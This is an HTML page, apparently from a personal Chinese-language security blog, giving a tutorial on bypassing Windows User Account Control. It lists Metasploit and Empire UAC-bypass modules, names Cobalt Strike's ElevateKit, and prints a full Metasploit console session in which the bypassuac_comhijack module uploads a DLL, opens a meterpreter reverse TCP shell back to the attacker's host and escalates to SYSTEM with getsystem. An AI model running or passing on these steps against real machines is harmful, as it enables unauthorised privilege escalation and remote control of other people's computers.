@@ -1,0 +1,223 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+    <meta name="Keywords" content="blog"/>
+    <meta name="Description" content="blog"/>
+    <title>Simple</title>
+    <link rel="shortcut icon" href="/static/favicon.png"/>
+    <link rel="stylesheet" type="text/css" href="/main.css" />
+</head>
+<body>
+<div class="main">
+    <div class="header">
+    	<ul id="pages">
+            <li><a href="/">home</a></li>
+            <li><a href="/#/tags">tags</a></li>
+            <li><a href="/#/archive">archive</a></li>
+    	</ul>
+    </div>
+	<div class="wrap-header">
+    <h1>
+    <a href="/" id="title"></a>
+    </h1>
+	</div>
+<xmp id="md" style="display: none;">
+<!-- markdown -->
+UAC 全称 User Access Control, 其作用为在程序进行管理员权限的操作时对用户进行通知, 经确认以后方可才能继续执行操作.
+
+如果是普通用户, UAC 会让你提供管理员用户的账号密码.
+
+如果是管理员, 则会提醒你是否继续该操作. 这样的管理员就称作"受限管理员" (Administrator 用户除外).
+
+绕过 UAC 的方式很多, 比如 [hfiref0x/UACME](https://github.com/hfiref0x/UACME), 恕本人技术有限, 暂且先提供以下几种比较"方便"的 UAC 绕过方案.
+
+## metasploit
+
+msf 自带九种 bypassuac 模块.
+
+```
+exploit/windows/local/bypassuac
+exploit/windows/local/bypassuac_injection_winsxs
+exploit/windows/local/bypassuac_comhijack
+exploit/windows/local/bypassuac_silentcleanup
+exploit/windows/local/bypassuac_eventvwr
+exploit/windows/local/bypassuac_sluihijack
+exploit/windows/local/bypassuac_fodhelper
+exploit/windows/local/bypassuac_vbs
+exploit/windows/local/bypassuac_injection
+```
+
+其中 `bypassuac`, `bypassuac_injection` 历史久远, `bypassuac_comhijack` 目前还未修复.
+
+以 `exploit/windows/local/bypassuac_comhijack` 为例.
+
+```
+msf5 exploit(multi/handler) > use exploit/windows/local/bypassuac_comhijack                                             msf5 exploit(windows/local/bypassuac_comhijack) > set session 1                                                         session => 1                                                                                                                                                                                                                                                                                  msf5 exploit(windows/local/bypassuac_comhijack) > set payload windows/x64/meterpreter/reverse_tcp                       payload => windows/x64/meterpreter/reverse_tcp                                                                          msf5 exploit(windows/local/bypassuac_comhijack) > set lhost 192.168.1.1                                                 lhost => 192.168.1.1                                                                                                    msf5 exploit(windows/local/bypassuac_comhijack) > run                                                                                                                                                                                           [*] Started reverse TCP handler on 192.168.1.1:4444                                                                     [*] UAC is Enabled, checking level...                                                                                   [+] Part of Administrators group! Continuing...                                                                         [+] UAC is set to Default                                                                                               [+] BypassUAC can bypass this setting, continuing...                                                                    [*] Targeting Event Viewer via HKCU\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931} ...                   [*] Uploading payload to C:\Users\test\AppData\Local\Temp\DCRQHfyu.dll ...                                              [*] Executing high integrity process ...                                                                                [*] Sending stage (206403 bytes) to 192.168.1.99                                                                        [*] Meterpreter session 2 opened (192.168.1.1:4444 -> 192.168.1.99:49164) at 2019-07-12 21:25:32 +0800                                                                                                                                          [*] Cleaining up registry ...
+
+meterpreter > getuid
+Server username: DC2\test
+meterpreter > getsystem
+...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM                                                                          
+```
+
+## cobalt strike
+
+cs 自带的 bypassuac 模块与 msf 中的某些模块重复, 添加 [rsmudge/ElevateKit](https://github.com/rsmudge/ElevateKit) 工具包后新增三种 bypassuac 方式, 例如 `uac-wscript`, `uac-token` 等.
+
+![cobaltstrike elevate bypassuac 1](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/2019/cobaltstrike_elevate_bypassuac_1.jpg)
+
+![cobaltstrike elevate bypassuac 2](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/2019/cobaltstrike_elevate_bypassuac_2.jpg)
+
+## empire
+
+empire 中的部分 bypassuac 脚本还是比较新的, 不过全都是以 powershell 方式执行.
+
+```
+powershell/privesc/bypassuac
+powershell/privesc/bypassuac_eventvwr
+powershell/privesc/bypassuac_sdctlbypass
+powershell/privesc/bypassuac_wscript
+powershell/privesc/bypassuac_env
+powershell/privesc/bypassuac_fodhelper
+powershell/privesc/bypassuac_tokenmanipulation                                      
+```
+
+演示略.
+<!-- markdown end -->
+</xmp>
+<div class="entry" id="main">
+<!-- content -->
+<p>UAC 全称 User Access Control, 其作用为在程序进行管理员权限的操作时对用户进行通知, 经确认以后方可才能继续执行操作.</p>
+
+<p>如果是普通用户, UAC 会让你提供管理员用户的账号密码.</p>
+
+<p>如果是管理员, 则会提醒你是否继续该操作. 这样的管理员就称作"受限管理员" (Administrator 用户除外).</p>
+
+<p>绕过 UAC 的方式很多, 比如 <a href="https://github.com/hfiref0x/UACME">hfiref0x/UACME</a>, 恕本人技术有限, 暂且先提供以下几种比较"方便"的 UAC 绕过方案.</p>
+
+<h2 id="metasploit">metasploit</h2>
+
+<p>msf 自带九种 bypassuac 模块.</p>
+
+<pre><code>exploit/windows/local/bypassuac
+exploit/windows/local/bypassuac_injection_winsxs
+exploit/windows/local/bypassuac_comhijack
+exploit/windows/local/bypassuac_silentcleanup
+exploit/windows/local/bypassuac_eventvwr
+exploit/windows/local/bypassuac_sluihijack
+exploit/windows/local/bypassuac_fodhelper
+exploit/windows/local/bypassuac_vbs
+exploit/windows/local/bypassuac_injection
+</code></pre>
+
+<p>其中 <code>bypassuac</code>, <code>bypassuac_injection</code> 历史久远, <code>bypassuac_comhijack</code> 目前还未修复.</p>
+
+<p>以 <code>exploit/windows/local/bypassuac_comhijack</code> 为例.</p>
+
+<pre><code>msf5 exploit(multi/handler) &gt; use exploit/windows/local/bypassuac_comhijack                                             msf5 exploit(windows/local/bypassuac_comhijack) &gt; set session 1                                                         session =&gt; 1                                                                                                                                                                                                                                                                                  msf5 exploit(windows/local/bypassuac_comhijack) &gt; set payload windows/x64/meterpreter/reverse_tcp                       payload =&gt; windows/x64/meterpreter/reverse_tcp                                                                          msf5 exploit(windows/local/bypassuac_comhijack) &gt; set lhost 192.168.1.1                                                 lhost =&gt; 192.168.1.1                                                                                                    msf5 exploit(windows/local/bypassuac_comhijack) &gt; run                                                                                                                                                                                           [*] Started reverse TCP handler on 192.168.1.1:4444                                                                     [*] UAC is Enabled, checking level...                                                                                   [+] Part of Administrators group! Continuing...                                                                         [+] UAC is set to Default                                                                                               [+] BypassUAC can bypass this setting, continuing...                                                                    [*] Targeting Event Viewer via HKCU\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931} ...                   [*] Uploading payload to C:\Users\test\AppData\Local\Temp\DCRQHfyu.dll ...                                              [*] Executing high integrity process ...                                                                                [*] Sending stage (206403 bytes) to 192.168.1.99                                                                        [*] Meterpreter session 2 opened (192.168.1.1:4444 -&gt; 192.168.1.99:49164) at 2019-07-12 21:25:32 +0800                                                                                                                                          [*] Cleaining up registry ...
+
+meterpreter &gt; getuid
+Server username: DC2\test
+meterpreter &gt; getsystem
+...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+meterpreter &gt; getuid
+Server username: NT AUTHORITY\SYSTEM                                                                          
+</code></pre>
+
+<h2 id="cobaltstrike">cobalt strike</h2>
+
+<p>cs 自带的 bypassuac 模块与 msf 中的某些模块重复, 添加 <a href="https://github.com/rsmudge/ElevateKit">rsmudge/ElevateKit</a> 工具包后新增三种 bypassuac 方式, 例如 <code>uac-wscript</code>, <code>uac-token</code> 等.</p>
+
+<p><img src="https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/2019/cobaltstrike_elevate_bypassuac_1.jpg" alt="cobaltstrike elevate bypassuac 1" title=""></p>
+
+<p><img src="https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/2019/cobaltstrike_elevate_bypassuac_2.jpg" alt="cobaltstrike elevate bypassuac 2" title=""></p>
+
+<h2 id="empire">empire</h2>
+
+<p>empire 中的部分 bypassuac 脚本还是比较新的, 不过全都是以 powershell 方式执行.</p>
+
+<pre><code>powershell/privesc/bypassuac
+powershell/privesc/bypassuac_eventvwr
+powershell/privesc/bypassuac_sdctlbypass
+powershell/privesc/bypassuac_wscript
+powershell/privesc/bypassuac_env
+powershell/privesc/bypassuac_fodhelper
+powershell/privesc/bypassuac_tokenmanipulation                                      
+</code></pre>
+
+<p>演示略.</p>
+<!-- content end -->
+</div>
+<br>
+<br>
+    <div id="disqus_thread"></div>
+	<div class="footer">
+		<p>© Copyright 2017-2019 by X1r0z</p>
+	</div>
+</div>
+<script src="main.js"></script>
+<script id="content" type="text/mustache">
+    <h1>{{title}}</h1>
+    <div class="tag">
+    {{date}}
+    {{#tags}}
+    <a href="/#/tag/{{name}}">#{{name}}</a>
+    {{/tags}}
+    </div>
+</script>
+<script id="pagesTemplate" type="text/mustache">
+    {{#pages}}
+    <li>
+        <a href="{{path}}">{{title}}</a>
+    </li>
+    {{/pages}}
+</script>
+<script>
+$(document).ready(function() {
+    $.ajax({
+        url: "main.json",
+        type: "GET",
+        dataType: "json",
+        success: function(data) {
+            $("#title").html(data.name);
+            var pagesTemplate = Hogan.compile($("#pagesTemplate").html());
+            var pagesHtml = pagesTemplate.render({"pages": data.pages});
+            $("#pages").append(pagesHtml);
+            //path
+            var path = "windows-bypass-uac.html";
+            //path end
+            var now = 0;
+            for (var i = 0; i < data.posts.length; ++i)
+                if (path == data.posts[i].path)
+                    now = i;
+            var post = data.posts[now];
+            var tmp = post.tags.split(" ");
+            var tags = [];
+            for (var i = 0; i < tmp.length; ++i)
+                if (tmp[i].length > 0)
+                    tags.push({"name": tmp[i]});
+            var contentTemplate = Hogan.compile($("#content").html());
+            var contentHtml = contentTemplate.render({"title": post.title, "tags": tags, "date": post.date});
+            $("#main").prepend(contentHtml);
+            if (data.disqus_shortname.length > 0) {
+                var disqus_shortname = data.disqus_shortname;
+                (function() {
+                    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+                    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+                    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+                })();
+            }
+        }
+    });
+});
+</script>
+<script src="http://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({tex2jax: {inlineMath: [['$','$'], ["\\(", "\\)"]], processEscapes: true}});
+</script>
+</body>
+</html>
